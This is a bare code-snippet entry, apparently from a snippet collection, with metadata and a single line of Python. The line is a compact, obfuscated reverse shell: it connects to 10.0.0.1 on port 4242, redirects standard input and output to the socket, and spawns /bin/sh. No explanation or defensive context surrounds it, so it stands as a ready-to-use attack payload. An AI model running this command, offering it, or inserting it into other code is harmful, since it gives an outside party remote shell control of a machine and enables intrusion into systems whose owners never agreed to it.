---
id: 3571f1bb-c3a6-4703-abf0-1b58c16a0e9f
type: code
language: Python
verified: false
created_at: '2023-04-06T03:56:24.246162+00:00'
updated_at: '2023-04-10T20:25:25.998104+00:00'
---

# Code Snippet 3571f1bb

**Language**: Python

```python
python -c 'a=__import__;s=a("socket");o=a("os").dup2;p=a("pty").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect(("10.0.0.1",4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
```


